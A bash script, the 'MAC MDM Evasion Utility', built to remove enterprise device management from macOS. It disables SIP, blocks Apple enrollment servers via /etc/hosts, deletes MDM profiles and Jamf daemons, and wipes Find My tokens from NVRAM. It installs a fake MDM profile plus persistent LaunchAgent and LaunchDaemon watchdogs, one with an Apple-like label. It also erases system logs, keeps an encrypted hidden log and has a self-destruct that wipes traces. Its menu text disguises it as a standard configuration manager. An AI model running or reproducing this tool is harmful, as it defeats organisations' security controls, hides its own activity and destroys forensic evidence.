#!/bin/bash
# =================================================
#  MAC MDM Evasion Utility — v1.8 (Watchdog-Class)
#  Author: Darknessownsu
#  macOS Big Sur → Sonoma
# =================================================

APP_NAME="MAC MDM Evasion Utility"
VERSION="1.8"
AUTHOR="Darknessownsu"

# Check for root privileges
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo "[!] Error: This utility must be run as root or with sudo."
        echo "[!] Please run: sudo $0"
        exit 1
    fi
}

SHADOW_DIR="/var/db/.shadow"
SHADOW_LOG="$SHADOW_DIR/mdm.log.enc"
mkdir -p "$SHADOW_DIR" 2>/dev/null
LOG_KEY=$(uuidgen | md5)

# ---------------------------
# Logging Function
# ---------------------------
# Logs messages to console and encrypted shadow log
logmsg() {
    while IFS= read -r line; do
        echo "$line"
        echo "$line" | openssl enc -aes-256-cbc -a -salt -pass pass:"$LOG_KEY" >> "$SHADOW_LOG" 2>/dev/null
    done
}

# ---------------------------
# Display Functions
# ---------------------------
# Displays banner with app information
banner() {
    clear
    echo "================================================="
    echo "        $APP_NAME"
    echo "        Version $VERSION"
    echo "        Author: $AUTHOR"
    echo "-------------------------------------------------"
    echo " Manage enrollment and configuration profiles"
    echo " on your Mac with a secure, menu-driven utility."
    echo "-------------------------------------------------"
    echo
}

# Displays status bar with message
status_bar() {
    local msg=$1
    echo "-------------------------------------------------"
    echo " Status: $msg"
    echo "-------------------------------------------------"
}

# ---------------------------
# Core Functions
# ---------------------------

# Performs MDM evasion with watchdog capabilities
# Includes: SIP disable, profile bypass, LaunchAgent/Daemon installation
evasion() {
    check_root
    banner
    status_bar "Running Evasion Sequence"
    
    echo "[!] WARNING: This will make significant system changes."
    read -r -p "Continue? (yes/no): " confirm
    if [ "$confirm" != "yes" ]; then
        echo "[*] Operation cancelled."
        read -r -p "Press Enter to return to menu..."
        return
    fi
    
    echo "[*] Disabling SIP + authenticated root..." | logmsg
    csrutil disable 2>&1 | logmsg
    csrutil authenticated-root disable 2>&1 | logmsg

    if ! /usr/bin/mount -uw / 2>&1 | logmsg; then
        echo "[!] Mount failed. System may be in recovery mode." | logmsg
        read -r -p "Press Enter to return to menu..."
        return
    fi

    HOSTS="/etc/hosts"
    if [ ! -f "$HOSTS" ]; then
        echo "[!] Error: /etc/hosts file not found." | logmsg
        read -r -p "Press Enter to return to menu..."
        return
    fi
    [ -f "$HOSTS" ] && cp "$HOSTS" "$HOSTS.backup.$(date +%s)" && echo "[*] Hosts backup saved." | logmsg
    for ep in mdmenrollment.apple.com deviceenrollment.apple.com gdmf.apple.com; do
        grep -q "$ep" "$HOSTS" || echo "127.0.0.1 $ep" >> "$HOSTS"
    done

    PROFILES=$(/usr/bin/profiles -P 2>/dev/null | grep "uuid" | awk -F: '{print $2}' | tr -d ' ')
    if [ -z "$PROFILES" ]; then
        echo "[*] No MDM profiles found to remove." | logmsg
    else
        for ID in $PROFILES; do
            echo "[*] Removing profile: $ID..." | logmsg
            /usr/bin/profiles -R -p "$ID" 2>&1 | logmsg
        done
    fi

    # Disable rogue MDM daemons
    shopt -s nullglob  # Handle case when no files match
    for svc in /Library/LaunchDaemons/*.plist; do
        [ -f "$svc" ] || continue
        if grep -qiE 'jamf|mdm|dep' "$svc" 2>/dev/null; then
            launchctl bootout system "$svc" 2>&1 | logmsg
            rm -f "$svc" && echo "[*] Disabled rogue daemon: $svc" | logmsg
        fi
    done
    shopt -u nullglob

    for dir in "/usr/local/jamf" "/Library/Application Support/Jamf"; do
        [ -d "$dir" ] && rm -rf "$dir" && echo "[*] Removed $dir" | logmsg
    done

    /usr/bin/log erase --all && echo "[*] Logs erased." | logmsg
    /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on
    /usr/sbin/nvram -c

    # iCloud/FindMy Obfuscation
    /usr/sbin/nvram -d fmm-mobileme-token-FMM
    /usr/sbin/nvram -d fmm-computer-name
    /usr/sbin/nvram -d wifiaddr
    echo "[*] iCloud FindMy token wiped." | logmsg

    # Fake Profile Payload
    BYPASS=$(mktemp /tmp/bypass_mdm.XXXXXX.mobileconfig)
    cat <<EOF > "$BYPASS"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>PayloadContent</key>
  <array>
    <dict>
      <key>PayloadType</key>
      <string>com.apple.mdm</string>
      <key>ServerURL</key>
      <string>https://localhost/mdm</string>
      <key>PayloadIdentifier</key>
      <string>com.bypass.mdm</string>
      <key>PayloadUUID</key>
      <string>$(uuidgen)</string>
      <key>PayloadDisplayName</key>
      <string>Enrollment Profile</string>
    </dict>
  </array>
  <key>PayloadType</key>
  <string>Configuration</string>
  <key>PayloadIdentifier</key>
  <string>com.bypass.config</string>
  <key>PayloadUUID</key>
  <string>$(uuidgen)</string>
  <key>PayloadDisplayName</key>
  <string>Enrollment Config</string>
</dict>
</plist>
EOF
    chmod 600 "$BYPASS"  # Restrict access to root only
    if /usr/bin/profiles -I -F "$BYPASS" 2>&1 | logmsg; then
        echo "[*] Bypass profile installed successfully." | logmsg
    else
        echo "[!] Failed to install bypass profile." | logmsg
    fi
    
    # Keep bypass file for LaunchAgent to use
    cp "$BYPASS" /tmp/bypass_mdm.mobileconfig
    chmod 600 /tmp/bypass_mdm.mobileconfig
    rm -f "$BYPASS"

    # LaunchAgent – Self-Healing Profile Installer
    cat <<EOF > /Library/LaunchAgents/com.apple.mdmselfheal.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.mdmselfheal</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/profiles</string>
        <string>-I</string>
        <string>-F</string>
        <string>/tmp/bypass_mdm.mobileconfig</string>
    </array>
    <key>StartInterval</key>
    <integer>300</integer>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
    launchctl load /Library/LaunchAgents/com.apple.mdmselfheal.plist 2>&1 | logmsg
    echo "[*] Self-healing agent loaded." | logmsg

    # LaunchDaemon – MDM Watchdog
    cat <<EOF > /Library/LaunchDaemons/com.watchdog.mdm.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.watchdog.mdm</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/bash</string>
    <string>-c</string>
    <string>
      for svc in /Library/LaunchDaemons/*.plist; do
        if grep -qiE 'jamf|mdm|dep' "\$svc"; then
          launchctl bootout system "\$svc"
          rm -f "\$svc"
          echo "[*] Watchdog purged: \$svc"
        fi
      done
    </string>
  </array>
  <key>StartInterval</key>
  <integer>180</integer>
  <key>RunAtLoad</key>
  <true/>
</dict>
</plist>
EOF
    launchctl load /Library/LaunchDaemons/com.watchdog.mdm.plist 2>&1 | logmsg
    echo "[*] MDM Watchdog deployed." | logmsg

    /usr/sbin/bless --mount / --bootefi --create-snapshot 2>&1 | logmsg && echo "[*] Snapshot created." | logmsg
    status_bar "Evasion Complete – Restart Recommended"
    read -r -p "Press Enter to return to menu..."
}

# Reverts all MDM evasion changes including watchdog components
reversion() {
    check_root
    banner
    status_bar "Running Reversion Sequence"
    
    echo "[!] WARNING: This will revert system changes."
    read -r -p "Continue? (yes/no): " confirm
    if [ "$confirm" != "yes" ]; then
        echo "[*] Operation cancelled."
        read -r -p "Press Enter to return to menu..."
        return
    fi
    
    /usr/bin/profiles -R -p "com.bypass.mdm" 2>&1 | logmsg
    /usr/bin/profiles -R -p "com.bypass.config" 2>&1 | logmsg

    if ls /etc/hosts.backup.* 1> /dev/null 2>&1; then
        LATEST=$(find /etc -name "hosts.backup.*" -type f -print0 | xargs -0 ls -t | head -1)
        if [ -n "$LATEST" ] && [ -f "$LATEST" ]; then
            cp "$LATEST" /etc/hosts && echo "[*] Hosts restored from backup." | logmsg
        fi
    fi

    csrutil enable 2>&1 | logmsg
    csrutil authenticated-root enable 2>&1 | logmsg

    launchctl unload /Library/LaunchAgents/com.apple.mdmselfheal.plist 2>&1 | logmsg
    rm -f /Library/LaunchAgents/com.apple.mdmselfheal.plist

    launchctl unload /Library/LaunchDaemons/com.watchdog.mdm.plist 2>&1 | logmsg
    rm -f /Library/LaunchDaemons/com.watchdog.mdm.plist

    /usr/sbin/bless --mount / --bootefi --create-snapshot 2>&1 | logmsg && echo "[*] Fresh snapshot created." | logmsg

    status_bar "Reversion Complete – Restart Required"
    read -r -p "Press Enter to return to menu..."
}

# Displays information about shadow log and decryption
stealthlogs() {
    banner
    status_bar "Shadow Log Info"
    echo "[*] Shadow log: $SHADOW_LOG"
    echo "[*] Decrypt with:"
    echo "    openssl enc -aes-256-cbc -d -a -in $SHADOW_LOG -pass pass:\"$LOG_KEY\""
    read -r -p "Press Enter to return to menu..."
}

# Removes all traces including logs and backups
selfdestruct() {
    check_root
    banner
    status_bar "Wiping Traces"
    
    echo "[!] WARNING: This will permanently delete shadow logs and backups."
    read -r -p "Continue? (yes/no): " confirm
    if [ "$confirm" != "yes" ]; then
        echo "[*] Operation cancelled."
        read -r -p "Press Enter to return to menu..."
        return
    fi
    
    [ -n "$SHADOW_DIR" ] && rm -rf "${SHADOW_DIR:?}"/*
    for host_backup in /etc/hosts.backup.*; do
        [ -e "$host_backup" ] || break
        if [ -f "$host_backup" ]; then
            rm -f -- "$host_backup"
        fi
    done
    history -c
    echo "[*] Self-destruct complete." | logmsg
    read -r -p "Press Enter to return to menu..."
}

# Displays about information for the utility
about() {
    banner
    echo "-------------------------------------------------"
    echo " About This Utility"
    echo "-------------------------------------------------"
    echo " Name:     $APP_NAME"
    echo " Version:  $VERSION"
    echo " Author:   $AUTHOR"
    echo " Build:    Watchdog-Class, Glitch-Patched"
    echo "-------------------------------------------------"
    echo " This tool is presented as a standard macOS"
    echo " configuration manager. All actions are logged"
    echo " securely into shadow storage."
    echo "-------------------------------------------------"
    echo
    read -r -p "Press Enter to return to menu..."
}

# ---------------------------
# Menu Loop
# ---------------------------
while true; do
    banner
    echo "Choose an option:"
    echo "  1. Run Evasion"
    echo "  2. Run Reversion"
    echo "  3. Shadow Log Info"
    echo "  4. Self-Destruct / Wipe Traces"
    echo "  5. Exit"
    echo "  6. About This Utility"
    echo
    read -r -p "Choice: " opt
    
    # Validate input is a number between 1-6
    if ! [[ "$opt" =~ ^[1-6]$ ]]; then
        echo "[!] Invalid choice. Please enter a number between 1 and 6."
        read -r -p "Press Enter to continue..."
        continue
    fi
    
    case $opt in
        1) evasion ;;
        2) reversion ;;
        3) stealthlogs ;;
        4) selfdestruct ;;
        5) echo "[*] Exiting..."; exit 0 ;;
        6) about ;;
    esac
done